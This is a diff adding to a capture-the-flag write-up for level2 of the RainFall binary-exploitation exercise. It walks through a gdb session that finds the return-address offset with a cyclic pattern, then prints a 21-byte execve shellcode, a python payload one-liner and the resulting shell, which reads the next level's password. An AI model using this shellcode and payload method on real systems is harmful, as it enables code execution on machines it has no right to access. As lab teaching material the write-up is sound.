@@ -248,3 +248,87 @@ eax            0x804a008	134520840
 0xbffff750:	0x00000000	0xbffff71c	0xbffff7dc	0x00000000
 (gdb) #we can see the eax just got written into 0x804a008
 
+now we need to know the offset to be able to write into the eip, 
+
+we can see the eip pointer adress in the stack, so lets do a patern so we can se how many bytes are between our string read it in gets( to the eif pointer, 
+
+we will be using this generator to generate a bunch of hexadecimal numbers so we can check where we landed, https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+in any case here is a 200 legth pattern to test:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+so how we check this?, easy, we just put that into the payload
+
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+(gdb) run
+Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
+Loaded symbols for /lib/ld-linux.so.2
+Reading symbols from system-supplied DSO at 0xb7fdd000...(no debugging symbols found)...done.
+Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.
+Loaded symbols for /lib/i386-linux-gnu/libc.so.6
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+(gdb) #we just run the program and place the pattern so we can check here the eip was changed
+(gdb) #lets check the value of the eip
+(gdb) stack
+
+===== key registers =====
+esp            0xbffff730	0xbffff730
+ebp            0x63413563	0x63413563
+eip            0x37634136	0x37634136
+eax            0x804a008	134520840
+
+===== top of stack (40 words, hex) =====
+0xbffff730:	0x41386341	0x64413963	0x31644130	0x41326441
+0xbffff740:	0x64413364	0x35644134	0x41366441	0x64413764
+0xbffff750:	0x39644138	0x41306541	0x65413165	0x33654132
+0xbffff760:	0x41346541	0x65413565	0x37654136	0x41386541
+0xbffff770:	0x66413965	0x31664130	0x41326641	0x66413366
+0xbffff780:	0x35664134	0x41366641	0x66413766	0x39664138
+0xbffff790:	0x41306741	0x67413167	0x33674132	0x41346741
+0xbffff7a0:	0x67413567	0x08048400	0x00000000	0x08048441
+0xbffff7b0:	0x0804853f	0x00000001	0xbffff7d4	0x08048550
+0xbffff7c0:	0x080485c0	0xb7fed280	0xbffff7cc	0xb7fff918
+(gdb) as we can see the eip now points to 0x37634136
+Undefined command: "as".  Try "help".
+(gdb) #lets check the offset in the webpage
+
+in the webpage the offset gave us 80
+
+so we need do some maths
+
+in this case we are using a shell code of 21 bytes
+
+#source:https://www.exploit-db.com/exploits/13628
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+
+so 21 bytes - 80
+
+it gave us 59
+
+so the shellcode-the offset until the eip is 59
+
+lets make the python code
+
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\x04\xa0\x08"[::-1]' > payload
+
+and for last we just do the cat execution 
+
+cat payload - | ./level2
+
+and we got the shell
+
+level2@RainFall:~$ cat payload - | ./level2 
+j
+ X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+ls
+ls: cannot open directory .: Permission denied
+cd ..
+cd level3
+cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
